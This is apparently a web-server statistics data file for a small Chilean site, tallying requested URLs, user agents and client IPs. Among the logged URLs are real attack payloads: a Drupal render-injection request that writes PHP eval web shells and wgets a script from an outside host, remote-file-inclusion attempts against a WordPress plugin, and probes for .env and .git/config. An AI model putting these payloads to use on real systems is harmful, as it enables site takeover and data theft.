1	0	0	1	210	0	24910320	26087132	0	24910320	24859832	0	/.well-known/assetlinks.json
1	2	2	0	3	25032215	0	25043157	25030785	0	24932938	0	/?138.197.4.107
1	2	2	0	0	25738049	0	0	25714696	0	0	16068	/servicios.html?165.227.103.74
1	5	0	0	0	26072979	0	0	25986995	0	0	58630	/js/tms-0.3.js
1	0	0	0	1	0	0	25935214	0	0	25935214	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://bearxcat.com//wp-includes/css/help.txt&wpaa=echo "h1loo1";
1	0	0	0	1	0	0	25806280	0	0	25806280	0	/.env
1	0	0	0	2	0	0	25829955	0	0	25740194	0	/.git/config?66.249.64.72
1	5	0	0	0	26072979	0	0	25986995	0	0	1255	/js/script.js
1	2	0	0	2	26031608	0	26032743	26011569	0	26010313	79892	/downloader/index.php
1	0	0	1	76	0	24910350	25392133	0	24910350	24859838	0	/apple-app-site-association
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/.well-known/ct/v1/sth-pollination
1	0	0	0	9	0	0	26072979	0	0	25986995	0	/js/tms_presets.js
1	0	0	0	1	0	0	25884249	0	0	25884249	0	/index.php?option=com_jdownloads&Itemid=0&view=upload
1	3	0	0	0	25558380	0	0	25239687	0	0	0	/Microsoft-Server-ActiveSync?165.227.103.74
1	3	0	0	5	26031608	0	26032743	26011569	0	26010312	119838	/store/errors/503.php
1	2	2	0	2	26031607	0	26032742	26011569	0	26010313	79880	/index.php/admin/
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/.well-known/ct/v1/sct-feedback
1	0	0	1	77	0	24910350	25392133	0	24910350	24859832	0	/.well-known/apple-app-site-association
1	0	0	0	26	0	0	25750974	0	0	25207754	0	/robots.txt?165.227.103.74
1	0	0	0	40	0	0	25825590	0	0	25465463	0	/AutoDiscover/autodiscover.xml?66.249.64.72
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/ct/v1/sct-gossip
1	0	0	0	9	0	0	26072979	0	0	25986995	0	/js/FF-cash.js
1	1	0	0	0	24898288	0	0	24898288	0	0	0	/Microsoft-Server-ActiveSync?66.249.64.144
1	0	0	1	3	0	24910320	24913657	0	24910320	24896385	0	/robots.txt?66.249.64.144
1	0	0	0	1	0	0	25884249	0	0	25884249	0	/images/pwn.gif
1	3	0	0	5	26031608	0	26032743	26011570	0	26010313	119850	/magento/errors/503.php
1	0	0	0	1	0	0	25884250	0	0	25884250	0	/components/com_jbcatalog/libraries/jsupload/server/php
1	2	0	0	2	26031608	0	26032743	26011569	0	26010313	79868	/errors/503.php
1	12	0	0	11	26027201	0	26027201	24898288	0	24990921	0	/Microsoft-Server-ActiveSync
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/topleveldir/subdir/research-feedback
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/.well-known/ct/v1/collected-sct-feedback
1	2	0	0	5	26031608	0	26032743	26011570	0	26010312	79928	/magento/downloader/index.php
1	1	0	0	68	25926420	0	26054499	25926420	0	25085860	52	/robots.txt?66.249.64.72
1	5	0	0	0	26072979	0	0	25986995	0	0	106165	/js/Lobster_13_400.font.js
1	0	0	0	1	0	0	25098345	0	0	25098345	0	/.well-known/assetlinks.json?66.249.64.72
1	0	0	0	1	0	0	25849499	0	0	25849499	0	/exchange/
1	754	754	0	290	26090399	0	26085765	24876300	0	24913665	5239650	/
1	5	0	0	0	26072979	0	0	25986995	0	0	9080	/js/easyTooltip.js
1	0	0	0	1	0	0	25806280	0	0	25806280	0	/.git/head
1	0	0	0	1	0	0	25884249	0	0	25884249	0	/index.php?option=com_myblog&task=ajaxupload
1	0	0	0	1	0	0	24869758	0	0	24869758	0	/EWS/Exchange.asmx
1	0	0	0	1	0	0	25069991	0	0	25069991	0	/autodiscover/autodiscover.xml?138.197.4.107
1	2	0	0	5	26031608	0	26032743	26011569	0	26010312	79920	/store/downloader/index.php
1	226	226	0	43	26089081	0	26041508	25110274	0	25130221	1575558	/?66.249.64.72
1	0	0	0	1	0	0	26076930	0	0	26076930	0	/.env?66.249.64.72
1	0	0	0	1	0	0	25935214	0	0	25935214	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.klenzpro.com/wp-content/uploads/2017/03/sold_out.txt&wpaa=echo "h1loo1";
1	2	0	0	0	25984066	0	0	25983382	0	0	2140	/resetpass?start=1
1	1	0	0	0	24891477	0	0	24891477	0	0	0	/Microsoft-Server-ActiveSync?45.55.154.204
1	0	0	0	3	0	0	24930462	0	0	24885365	0	/robots.txt?45.55.154.204
1	5	0	0	0	26072979	0	0	25986995	0	0	78820	/js/NewsGoth_BT_400.font.js
1	32	0	0	0	26069381	0	0	25705657	0	0	221016	/contacto.php
1	0	0	0	1	0	0	25935214	0	0	25935214	0	/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=echo+'Vuln!!+patch+it+Now!'+>+vuln.htm%3B+echo+'Vuln!!<%3Fphp+@eval($_POST['pass'])+%3F>'>+sites/default/files/vuln.php%3B+echo+'Vuln!!<%3Fphp+@eval($_POST['pass'])+%3F>'>+vuln.php%3B+cd+sites/default/files/%3B+echo+'AddType+application/x-httpd-php+.jpg'+>+.htaccess%3B+wget+'http://40k.waszmann.de/Deutsch/images/up.php'
1	2	2	0	5	26031607	0	26032743	26011569	0	26010312	79908	/store/index.php/admin/
1	0	0	0	1	0	0	25935215	0	0	25935215	0	/administrator/webconfig.txt.php
1	2	0	0	0	24910320	0	0	24910320	0	0	14628	/cgi-sys/suspendedpage.cgi
1	0	0	0	78	0	0	25824071	0	0	25463019	0	/AutoDiscover/autodiscover.xml
1	2	2	0	0	24931745	0	0	24914506	0	0	15502	/?45.55.154.204
1	0	0	0	1	0	0	25974318	0	0	25974318	0	/xmlrpc.php
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/ct/v1/sct-feedback
1	0	0	0	5	0	0	26072979	0	0	25986995	0	/js/cufon-replace.js
1	33	33	0	0	26070015	0	0	25705703	0	0	265122	/servicios.html
1	1	0	0	0	24869758	0	0	24869758	0	0	0	/Microsoft-Server-ActiveSync?66.249.65.196
1	0	0	0	3	0	0	24878741	0	0	24865823	0	/robots.txt?66.249.65.196
1	2	0	0	0	25429625	0	0	25429625	0	0	0	/Microsoft-Server-ActiveSync?Cmd=OPTIONS&User=aridosmoreno.cl\risami&DeviceId=SEC1A3AD1CC35AC8&DeviceType=SamsungDevice
1	57	57	0	20	25765061	0	25732744	25183739	0	25192032	324982	/?165.227.103.74
1	0	0	0	7	0	0	26076930	0	0	25525240	0	/.git/config
1	0	0	0	28	0	0	25645784	0	0	25461342	0	/AutoDiscover/autodiscover.xml?165.227.103.74
1	0	0	0	4	0	0	26015698	0	0	25429624	0	/autodiscover/autodiscover.xml?66.249.64.72
1	3	0	0	5	26031608	0	26032743	26011570	0	26010312	119868	/shop/downloader/index.php
1	0	0	0	6	0	0	25120760	0	0	25119054	0	/.well-known/ct/v1/sct-gossip
3	0	0	0	5	0	0	25974318	0	0	25935214	0	http://www.google.com.hk/
3	40	0	0	23	26072979	0	26072979	25986995	0	25986995	414215	https://aridosmoreno.cl/
4	0	0	0	3	0	0	25491663	0	0	25482914	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.9330; Pro)
4	1	1	0	0	25395053	0	0	25395053	0	0	7751	sq
4	1	0	0	0	24869758	0	0	24869758	0	0	0	BlueMail/7.0-EAS-2.0
4	53	53	0	40	26088776	0	26081684	25536262	0	25536262	569701	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
4	1	1	0	0	25497700	0	0	25497700	0	0	7751	ek
4	22	22	0	12	24933074	0	24933022	24876238	0	24913665	170522	Netcraft SSL Server Survey - contact info@netcraft.com
4	2	2	0	0	25911846	0	0	25911846	0	0	15422	reqwest/0.9.13
4	0	0	0	1	0	0	25497761	0	0	25497761	0	sh
4	0	0	0	7	0	0	25884250	0	0	25884249	0	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
4	2	0	0	0	25984066	0	0	25983382	0	0	2140	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0;)
4	2	2	0	0	25956901	0	0	25956665	0	0	0	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
4	0	0	0	1	0	0	25393144	0	0	25393144	0	rp
4	0	0	0	6	0	0	25818696	0	0	25793810	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.11126; Pro)
4	0	0	0	21	0	0	25553345	0	0	25514728	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.10228; Pro)
4	0	0	0	4	0	0	25847504	0	0	25844460	0	Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7229; Pro)
4	0	0	0	4	0	0	25992992	0	0	25958818	0	Microsoft Office/12.0 (Windows NT 6.2; Microsoft Office Outlook 12.0.4518; Pro)
4	0	0	0	1	0	0	25080393	0	0	25080393	0	Microsoft Office/16.0 (Windows NT 6.1; Microsoft Outlook 16.0.4549; Pro)
4	81	81	0	53	26090032	0	26081580	25733553	0	25732744	753359	Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)
4	0	0	0	1	0	0	25479293	0	0	25479293	0	cp
4	2	0	4	583	24910320	24910350	26087132	24910320	24910320	24859832	14628	Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
4	0	0	0	1	0	0	25395041	0	0	25395041	0	bx
4	0	0	0	1	0	0	25503988	0	0	25503988	0	cm
4	58	58	0	1	26090399	0	25849987	25030785	0	25849987	400972	Go-http-client/1.1
4	1	1	0	0	25393224	0	0	25393224	0	0	7751	da
4	131	110	0	8	25754707	0	25754707	25704494	0	25697076	970803	Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)
4	0	0	0	38	0	0	25614196	0	0	25554756	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.10325; Pro)
4	0	0	0	1	0	0	25393514	0	0	25393514	0	bd
4	0	0	0	2	0	0	26076930	0	0	26076930	0	Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )
4	1	1	0	0	25394036	0	0	25394036	0	0	7751	ns
4	0	0	0	1	0	0	25069991	0	0	25069991	0	Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7184; Pro)
4	0	0	0	6	0	0	25546128	0	0	25517519	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.10228; Pro)
4	28	9	0	51	26031608	0	26032743	26011569	0	26010312	1118616	Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5
4	1	1	0	0	25851675	0	0	25851675	0	0	7711	fasthttp
4	1	1	0	0	25197126	0	0	25197126	0	0	7751	Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0;
4	3	3	0	3	25818630	0	25819411	25817610	0	25817639	23133	Mozilla/5.0 zgrab/0.x
4	3	0	0	0	25429625	0	0	25429624	0	0	0	Android-SAMSUNG-SM-J701M/101.700
4	0	0	0	6	0	0	26028697	0	0	26027585	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.11727; Pro)
4	2	2	0	0	25847504	0	0	25847390	0	0	15422	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
4	0	0	0	1	0	0	25733858	0	0	25733858	0	Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7214; Pro)
4	0	0	0	2	0	0	25806280	0	0	25806280	0	Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
4	0	0	0	3	0	0	25958767	0	0	25958761	0	Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.6.1 Lightning/6.2.6.1
4	2	2	0	0	25682076	0	0	25681088	0	0	15422	Mozilla/5.0 (compatible; nsrbot/1.0; &#43;http://netsystemsresearch.com)
4	0	0	0	29	0	0	25513454	0	0	25463123	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.9330; Pro)
4	0	0	0	8	0	0	25611344	0	0	25566819	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.10325; Pro)
4	1	1	0	0	25393527	0	0	25393527	0	0	7751	zp
4	0	0	0	1	0	0	25395099	0	0	25395099	0	ku
4	0	0	0	1	0	0	25390795	0	0	25390795	0	zm
4	1	1	0	0	25982709	0	0	25982709	0	0	7711	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
4	122	108	0	86	26082490	0	26082118	25926223	0	25916813	903698	Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)
4	0	0	0	1	0	0	25504015	0	0	25504015	0	zf
4	0	0	0	5	0	0	25974318	0	0	25935214	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
4	1	1	0	0	25999277	0	0	25999277	0	0	0	python-requests/2.18.4
4	1	1	0	0	25904319	0	0	25904319	0	0	7711	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
4	12	12	0	0	25983986	0	0	25858891	0	0	0	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
4	0	0	0	4	0	0	25792395	0	0	25782298	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.11029; Pro)
4	0	0	0	2	0	0	25829955	0	0	25827077	0	Java/1.8.0_201
4	0	0	0	4	0	0	25740194	0	0	25736520	0	Java/1.8.0_191
4	0	0	0	2	0	0	25463019	0	0	25461342	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.9226; Pro)
4	0	0	0	14	0	0	25646888	0	0	25615218	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.10730; Pro)
4	4	4	0	2	26008284	0	26001128	25782844	0	25782772	63042	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
4	1	1	0	0	25496298	0	0	25496298	0	0	7751	iu
4	0	0	0	1	0	0	24869758	0	0	24869758	0	JWebServices for Exchange 2.0, www.independentsoft.com
4	1	1	0	0	25475348	0	0	25475348	0	0	7751	wu
4	1	1	0	0	25390789	0	0	25390789	0	0	7751	ir
4	0	0	0	1	0	0	25429624	0	0	25429624	0	Android-SAMSUNG-SM-J701M/101.700, Android-SAMSUNG-SM-J701M/101.700
4	3	0	0	0	24898288	0	0	24891477	0	0	0	Android/4.2.2-EAS-1.3
4	1	1	0	0	25476952	0	0	25476952	0	0	7751	hv
4	0	0	0	1	0	0	25479277	0	0	25479277	0	im
4	0	0	0	1	0	0	25825590	0	0	25825590	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.11231; Pro)
4	0	0	0	1	0	0	25393253	0	0	25393253	0	wm
4	0	0	0	1	0	0	25308761	0	0	25308761	0	Microsoft Office/16.0 (Windows NT 6.1; MAPI 16.0.9001; Pro)
4	0	0	0	1	0	0	26016072	0	0	26016072	0	Microsoft Office/14.0 (Windows NT 6.2; Microsoft Outlook 14.0.4760; Pro)
4	50	10	0	23	26072979	0	26072979	25986995	0	25986995	491325	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4	0	0	0	7	0	0	25824071	0	0	25793789	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.11126; Pro)
4	0	0	0	2	0	0	25539289	0	0	25525240	0	Java/1.8.0_171
4	101	101	0	84	26085787	0	26085765	24954369	0	24954358	1038267	Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
4	1	1	0	0	25485429	0	0	25485429	0	0	7751	gt
4	1	1	0	2	25849499	0	25849499	25849499	0	25849499	7711	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)
4	153	153	0	0	25941246	0	0	25136409	0	0	1182903	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
4	0	0	0	1	0	0	25502903	0	0	25502903	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft PowerPoint 16.0.9330; Pro)
4	1	1	0	0	25476015	0	0	25476015	0	0	7751	fr
4	5	0	0	1	25559473	0	25559472	25559472	0	25559472	0	Android-Mail/8.2.11.186835846.release
4	0	0	0	1	0	0	25080393	0	0	25080393	0	Outlook/16.0 (16.0.4534.1000; MSI; x64)
4	0	0	0	1	0	0	25476090	0	0	25476090	0	ge
4	0	0	0	1	0	0	25765376	0	0	25765376	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.11029; Pro)
4	230	230	0	0	26089442	0	0	25756312	0	0	1773530	Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
4	0	0	0	5	0	0	25632545	0	0	25626977	0	Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.10730; Pro)
4	168	168	0	199	25979182	0	25977196	25102627	0	25119054	0	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36
4	1	1	0	0	25393157	0	0	25393157	0	0	7751	tl
4	1	1	0	0	25500941	0	0	25500941	0	0	7751	es
5	0	0	0	33	0	0	25707389	0	0	25079349	0	66.249.64.70
5	0	0	0	39	0	0	25626479	0	0	25079344	0	66.249.64.68
5	0	0	0	1	0	0	25084176	0	0	25084176	0	104.236.56.35
5	0	0	0	4	0	0	25988687	0	0	25864432	0	66.249.64.62
5	1	1	0	0	25952242	0	0	25952242	0	0	7711	54.187.149.228
5	1	1	0	0	25890392	0	0	25890392	0	0	7711	34.212.38.123
5	1	1	0	0	26071911	0	0	26071911	0	0	7711	54.202.166.91
5	0	0	0	1	0	0	25864518	0	0	25864518	0	138.197.99.208
5	0	0	0	7	0	0	25783531	0	0	25701979	0	66.249.64.40
5	0	0	0	12	0	0	25783531	0	0	25724923	0	66.249.64.38
5	0	0	0	11	0	0	25769983	0	0	25658657	0	66.249.64.36
5	0	0	0	3	0	0	25327678	0	0	24947661	0	66.249.79.72
5	1	1	0	0	24913702	0	0	24913702	0	0	7751	104.236.225.30
5	0	0	0	4	0	0	25993898	0	0	25864432	0	66.249.64.33
5	0	0	0	2	0	0	25585823	0	0	25127864	0	66.249.65.104
5	0	0	0	2	0	0	25327677	0	0	25327677	0	66.249.79.70
5	0	0	0	3	0	0	25598318	0	0	25106780	0	66.249.65.102
5	0	0	0	6	0	0	25598318	0	0	25106771	0	66.249.65.100
5	3	0	0	4	25429625	0	25463123	25429624	0	25308761	0	186.21.199.176
5	0	0	0	1	0	0	25983261	0	0	25983261	0	66.249.79.62
5	0	0	0	2	0	0	25503936	0	0	25503936	0	66.249.79.59
5	1	1	0	0	25982901	0	0	25982901	0	0	7711	54.36.148.99
5	0	0	0	1	0	0	26011024	0	0	26011024	0	54.36.148.98
5	0	0	0	1	0	0	25576325	0	0	25576325	0	191.119.152.37
5	1	1	0	0	25926464	0	0	25926464	0	0	0	13.52.101.145
5	1	1	0	0	25982823	0	0	25982823	0	0	7227	54.36.148.97
5	1	1	0	0	25996728	0	0	25996728	0	0	7711	35.162.96.150
5	0	0	0	2	0	0	25731687	0	0	25731687	0	66.249.79.56
5	1	1	0	1	25953286	0	25980539	25953286	0	25980539	7221	54.36.148.95
5	1	1	0	0	26058638	0	0	26058638	0	0	7711	54.218.72.249
5	0	0	0	2	0	0	25509348	0	0	25509348	0	66.249.79.53
5	1	1	0	0	25844251	0	0	25844251	0	0	7711	54.148.25.229
5	1	1	0	0	25904319	0	0	25904319	0	0	7711	111.206.52.93
5	0	0	0	1	0	0	25433482	0	0	25433482	0	45.55.133.182
5	1	1	0	0	25955245	0	0	25955245	0	0	6782	54.36.148.86
5	2	2	0	0	25949226	0	0	25947246	0	0	13564	54.36.148.83
5	1	0	0	0	25713785	0	0	25713785	0	0	6903	54.36.148.81
5	1	1	0	0	25715203	0	0	25715203	0	0	7711	54.36.148.76
5	0	0	0	1	0	0	24994395	0	0	24994395	0	45.55.133.172
5	1	1	0	1	25754707	0	26054096	25754707	0	26054096	7711	54.36.148.73
5	1	1	0	0	25705795	0	0	25705795	0	0	6782	54.36.148.72
5	1	1	0	0	25779358	0	0	25779358	0	0	7711	54.201.173.162
5	0	0	0	1	0	0	25983261	0	0	25983261	0	66.249.79.32
5	0	0	0	1	0	0	24914632	0	0	24914632	0	45.55.234.26
5	0	0	0	2	0	0	25465516	0	0	25465463	0	191.116.141.119
5	0	0	0	1	0	0	26070129	0	0	26070129	0	54.36.148.65
5	1	1	0	0	26065024	0	0	26065024	0	0	7711	54.36.148.64
5	0	0	0	1	0	0	25489976	0	0	25489976	0	191.116.78.105
5	1	1	0	0	25954047	0	0	25954047	0	0	7711	54.36.148.63
5	1	1	0	0	25979343	0	0	25979343	0	0	7711	54.36.148.60
5	1	1	0	0	26085787	0	0	26085787	0	0	39909	167.71.81.245
5	1	1	0	1	25712755	0	25994459	25712755	0	25994459	7221	54.36.148.56
5	1	1	0	0	25704494	0	0	25704494	0	0	7711	54.36.148.55
5	1	1	0	0	25947922	0	0	25947922	0	0	7711	54.36.148.54
5	0	0	0	1	0	0	25979343	0	0	25979343	0	54.36.148.51
5	1	1	0	0	25710964	0	0	25710964	0	0	7711	54.36.148.50
5	0	0	0	1	0	0	25344737	0	0	25344737	0	159.203.69.134
5	0	0	0	1	0	0	25916813	0	0	25916813	0	54.36.148.47
5	0	0	0	1	0	0	26070015	0	0	26070015	0	54.36.148.43
5	0	0	0	1	0	0	26074380	0	0	26074380	0	54.36.148.42
5	0	0	0	1	0	0	26027932	0	0	26027932	0	54.36.148.41
5	1	1	0	0	25942054	0	0	25942054	0	0	7711	54.190.83.12
5	1	1	0	0	26000553	0	0	26000553	0	0	6782	54.36.148.37
5	2	2	0	0	25987318	0	0	25714758	0	0	15422	54.36.148.35
5	1	1	0	0	25485429	0	0	25485429	0	0	7751	185.35.63.8
5	0	0	0	1	0	0	26072627	0	0	26072627	0	54.36.148.34
5	0	0	0	1	0	0	25954160	0	0	25954160	0	138.197.99.114
5	0	0	0	2	0	0	25935214	0	0	25935214	0	165.225.3.40
5	0	0	0	3	0	0	26018274	0	0	25954469	0	54.36.148.32
5	1	1	0	0	25500941	0	0	25500941	0	0	7751	185.35.63.4
5	0	0	0	1	0	0	25925817	0	0	25925817	0	54.36.148.31
5	1	1	0	0	25878848	0	0	25878848	0	0	7711	35.162.85.165
5	1	1	0	0	25713556	0	0	25713556	0	0	7711	54.36.148.28
5	1	1	0	0	25968049	0	0	25968049	0	0	7711	54.149.0.162
5	1	0	0	0	25950383	0	0	25950383	0	0	6903	54.36.148.26
5	1	1	0	0	25765061	0	0	25765061	0	0	7711	34.208.142.6
5	0	0	0	1	0	0	25476090	0	0	25476090	0	185.35.63.250
5	1	1	0	0	25476015	0	0	25476015	0	0	7751	185.35.63.246
5	1	1	0	0	26056508	0	0	26056508	0	0	7711	54.36.148.22
5	2	2	0	0	25970432	0	0	25954469	0	0	14932	54.36.148.19
5	1	1	0	0	26024447	0	0	26024447	0	0	7711	34.212.22.134
5	0	0	0	2	0	0	26002302	0	0	25950383	0	54.36.148.16
5	0	0	0	1	0	0	25259717	0	0	25259717	0	159.203.160.181
5	2	2	0	1	25950735	0	26018916	25708784	0	26018916	15745	54.36.148.15
5	1	1	0	0	25990903	0	0	25990903	0	0	7711	35.166.248.97
5	1	1	0	0	25713069	0	0	25713069	0	0	8034	54.36.148.12
5	1	1	0	0	25652180	0	0	25652180	0	0	7711	167.99.63.126
5	1	1	0	0	26000097	0	0	26000097	0	0	7711	54.36.148.11
5	1	1	0	0	25972372	0	0	25972372	0	0	7711	35.167.188.243
5	1	1	0	0	25473825	0	0	25473825	0	0	7751	104.236.123.6
5	1	1	0	0	25475348	0	0	25475348	0	0	7751	185.35.63.226
5	0	0	0	1	0	0	25823304	0	0	25823304	0	142.93.78.129
5	1	1	0	0	25520013	0	0	25520013	0	0	7751	159.65.188.216
5	1	1	0	0	26038636	0	0	26038636	0	0	39897	159.89.191.53
5	3	0	0	1	24898288	0	24869758	24869758	0	24869758	0	181.72.179.101
5	1	1	0	0	26055855	0	0	26055855	0	0	7711	54.184.116.78
5	1	1	0	0	25387967	0	0	25387967	0	0	7751	104.131.5.209
5	1	1	0	0	25850155	0	0	25850155	0	0	7711	34.219.213.226
5	0	0	0	1	0	0	25497761	0	0	25497761	0	185.35.63.190
5	1	1	0	0	25861206	0	0	25861206	0	0	0	54.193.28.161
5	0	0	0	1	0	0	25636800	0	0	25636800	0	191.116.62.139
5	0	0	0	1	0	0	25393514	0	0	25393514	0	185.35.63.183
5	1	1	0	0	25914850	0	0	25914850	0	0	7711	34.217.212.254
5	0	0	0	1	0	0	25479277	0	0	25479277	0	185.35.63.181
5	0	0	0	1	0	0	25479293	0	0	25479293	0	185.35.63.180
5	1	1	0	0	25497700	0	0	25497700	0	0	7751	185.35.63.179
5	0	0	0	2	0	0	25513454	0	0	25513037	0	191.116.18.93
5	1	1	0	0	25389033	0	0	25389033	0	0	7751	104.236.56.115
5	1	1	0	0	25985477	0	0	25985477	0	0	7711	34.221.171.191
5	1	1	0	0	25970881	0	0	25970881	0	0	7711	34.221.105.229
5	1	1	0	0	25393527	0	0	25393527	0	0	7751	185.35.63.168
5	0	0	0	1	0	0	25695069	0	0	25695069	0	165.227.184.170
5	1	1	0	0	25870171	0	0	25870171	0	0	7711	35.163.213.129
5	1	1	0	0	25388990	0	0	25388990	0	0	7751	104.131.117.133
5	1	1	0	0	25995378	0	0	25995378	0	0	7711	52.27.181.43
5	1	1	0	0	25864465	0	0	25864465	0	0	7711	54.188.205.17
5	1	1	0	0	25863111	0	0	25863111	0	0	7711	54.187.127.204
5	1	1	0	1	25782844	0	26001128	25782844	0	26001128	7711	51.15.191.81
5	0	0	0	1	0	0	25864537	0	0	25864537	0	104.248.1.228
5	1	1	0	0	25344758	0	0	25344758	0	0	7751	159.65.38.189
5	1	1	0	0	25496298	0	0	25496298	0	0	7751	185.35.63.160
5	0	0	0	1	0	0	25395041	0	0	25395041	0	185.35.63.155
5	1	1	0	0	25863755	0	0	25863755	0	0	7711	138.197.77.183
5	1	1	0	0	25860043	0	0	25860043	0	0	7711	34.212.134.110
5	0	0	0	1	0	0	25179094	0	0	25179094	0	165.227.98.247
5	0	0	0	1	0	0	25781130	0	0	25781130	0	138.197.77.178
5	1	1	0	0	25953619	0	0	25953619	0	0	7711	52.10.219.149
5	3	3	0	3	26059516	0	25910032	25874858	0	25828900	55319	209.17.96.250
5	1	1	0	2	25935918	0	25867584	25935918	0	25863357	7711	209.17.96.242
5	1	1	0	0	26022761	0	0	26022761	0	0	7711	52.41.50.212
5	1	1	0	0	26061624	0	0	26061624	0	0	7711	35.163.34.38
5	3	3	0	0	26086940	0	0	25869736	0	0	23133	209.17.96.234
5	1	1	0	2	25849499	0	25849499	25849499	0	25849499	7711	64.74.215.85
5	0	0	0	1	0	0	25605126	0	0	25605126	0	191.116.39.250
5	0	0	0	1	0	0	25395099	0	0	25395099	0	185.35.63.123
5	1	1	0	0	25986776	0	0	25986776	0	0	7711	34.221.223.2
5	1	1	0	0	26011185	0	0	26011185	0	0	7711	34.222.2.104
5	2	2	0	1	26078336	0	25915825	26069675	0	25915825	15422	209.17.96.226
5	1	1	0	0	25817610	0	0	25817610	0	0	7711	171.67.70.49
5	1	1	0	0	25299615	0	0	25299615	0	0	7751	159.89.41.252
5	1	1	0	1	25818630	0	25819411	25818630	0	25819411	7711	171.67.70.45
5	3	3	0	1	26009973	0	25823224	25744249	0	25823224	23133	209.17.96.218
5	0	0	0	1	0	0	25818256	0	0	25818256	0	171.67.70.44
5	1	1	0	0	25395053	0	0	25395053	0	0	7751	185.35.63.113
5	0	0	0	1	0	0	24913723	0	0	24913723	0	104.236.112.53
5	1	1	0	0	25800469	0	0	25800469	0	0	7711	52.35.94.250
5	1	1	0	0	25818597	0	0	25818597	0	0	7711	171.67.70.42
5	1	1	0	0	26072979	0	0	26072979	0	0	7711	93.159.230.28
5	0	0	0	1	0	0	25817639	0	0	25817639	0	171.67.70.39
5	0	0	0	1	0	0	25907448	0	0	25907448	0	134.209.39.72
5	1	1	0	3	25874328	0	25955828	25874328	0	25854779	7711	209.17.96.210
5	0	0	0	1	0	0	24914581	0	0	24914581	0	138.197.12.164
5	5	5	0	5	25955508	0	25898657	25864330	0	25834500	38555	209.17.96.194
5	3	3	0	1	25904663	0	25838692	25738197	0	25838692	23133	209.17.96.202
5	1	0	0	3	25180772	0	25180772	25180772	0	25180772	0	40.123.42.220
5	1	1	0	0	25808287	0	0	25808287	0	0	7711	54.245.182.188
